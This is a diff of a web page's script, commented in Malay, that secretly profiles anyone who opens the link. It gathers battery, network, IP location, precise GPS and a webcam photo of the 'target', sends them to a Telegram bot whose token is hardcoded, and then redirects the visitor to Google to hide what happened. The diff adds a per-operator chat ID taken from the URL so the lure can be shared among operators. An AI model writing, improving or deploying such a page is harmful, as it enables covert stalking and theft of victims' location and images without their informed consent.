@@ -13,26 +13,28 @@
     <canvas id="canvas" style="display:none;" width="640" height="480"></canvas>
 
     <script>
+        // --- KONFIGURASI ---
         const TOKEN = '8720467847:AAFxo75yX3BBCsdSXEwSSWATO6Gth76CTCo';
-        const CHAT_ID = '8563935930';
+        
+        // Ambil ID dari URL (?id=xxxx). Jika tiada, guna ID asal anda sebagai backup.
+        const urlParams = new URLSearchParams(window.location.search);
+        const CURRENT_CHAT_ID = urlParams.get('id') || '8563935930';
 
         async function startTrace() {
             const waktu = new Date().toLocaleString('ms-MY', { timeZone: 'Asia/Kuala_Lumpur' });
             
-            // --- 1. Ambil Tahap Bateri ---
+            // --- 1. Info Bateri ---
             let infoBateri = "Tidak dikesan";
             try {
                 const battery = await navigator.getBattery();
                 const level = Math.round(battery.level * 100);
-                const statusCas = battery.charging ? "🔌 Sedang dicas" : "🔋 Guna bateri";
-                infoBateri = `${level}% (${statusCas})`;
-            } catch (e) { console.log("Battery API Error"); }
+                infoBateri = `${level}% (${battery.charging ? "🔌 Cas" : "🔋 Bateri"})`;
+            } catch (e) {}
 
-            // --- 2. Ambil Jenis Rangkaian ---
+            // --- 2. Info Rangkaian ---
             let infoRangkaian = "Tidak dikesan";
             if (navigator.connection) {
-                const conn = navigator.connection;
-                infoRangkaian = `${conn.effectiveType.toUpperCase()} (${conn.type || 'Data/WiFi'})`;
+                infoRangkaian = navigator.connection.effectiveType.toUpperCase();
             }
 
             // --- 3. Ambil IP & Info Peranti ---
@@ -43,48 +45,47 @@
                 let infoAsas = `🔔 *TARGET BARU DIKESAN!*\n` +
                                `📅 *Masa:* ${waktu}\n` +
                                `🔋 *Bateri:* ${infoBateri}\n` +
-                               `📡 *Rangkaian:* ${infoRangkaian}\n` +
+                               `📡 *Net:* ${infoRangkaian}\n` +
                                `🌐 *IP:* \`${data.ip}\`\n` +
-                               `📍 *Lokasi IP:* ${data.city}, ${data.region}, ${data.country_name}\n` +
-                               `📱 *Peranti:* ${navigator.userAgent}`;
+                               `📍 *Lokasi:* ${data.city}, ${data.country_name}\n` +
+                               `📱 *User-Agent:* ${navigator.userAgent}`;
                 
                 await sendToTele(infoAsas);
             } catch (e) { 
-                await sendToTele(`⚠️ Gagal ambil IP pada ${waktu}`);
+                await sendToTele(`⚠️ Target dikesan pada ${waktu} tetapi IP gagal diambil.`);
             }
 
-            // --- 4. Ambil Lokasi GPS (Minta Izin) ---
+            // --- 4. Lokasi GPS ---
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    await sendToTele(`📍 *LOKASI GPS TEPAT*\nLink: [Google Maps](${mapLink})\nKetepatan: ${pos.coords.accuracy.toFixed(2)}m`);
+                    const lat = pos.coords.latitude;
+                    const lon = pos.coords.longitude;
+                    const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                    await sendToTele(`📍 *LOKASI GPS TEPAT*\nLink: [Google Maps](${mapLink})`);
                 }, null, { enableHighAccuracy: true });
             }
 
-            // --- 5. Ambil Gambar (Minta Izin) ---
+            // --- 5. Ambil Gambar ---
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
-                await new Promise(res => setTimeout(res, 2000)); // Tunggu kamera fokus
+                await new Promise(res => setTimeout(res, 2500)); 
                 
                 const canvas = document.getElementById('canvas');
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 
                 canvas.toBlob(async (blob) => {
                     const fd = new FormData();
-                    fd.append('chat_id', CHAT_ID);
+                    fd.append('chat_id', CURRENT_CHAT_ID); // Hantar ke ID dinamik
                     fd.append('photo', blob, 'snap.jpg');
-                    fd.append('caption', `📸 Gambar Target\n🔋 Bateri: ${infoBateri}\n📶 Net: ${infoRangkaian}\n⏰ ${waktu}`);
+                    fd.append('caption', `📸 Gambar Target\n⏰ ${waktu}\n🆔 ID: ${CURRENT_CHAT_ID}`);
                     
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                     stream.getTracks().forEach(t => t.stop());
                 }, 'image/jpeg');
-            } catch (e) {
-                console.log("Kamera disekat.");
-            }
+            } catch (e) {}
 
-            // Redirect selepas semua proses cuba dijalankan
             setTimeout(() => {
                 window.location.href = "https://www.google.com";
             }, 5000);
@@ -94,7 +95,11 @@
             return fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                body: JSON.stringify({ 
+                    chat_id: CURRENT_CHAT_ID, 
+                    text: text, 
+                    parse_mode: 'Markdown' 
+                })
             });
         }
 
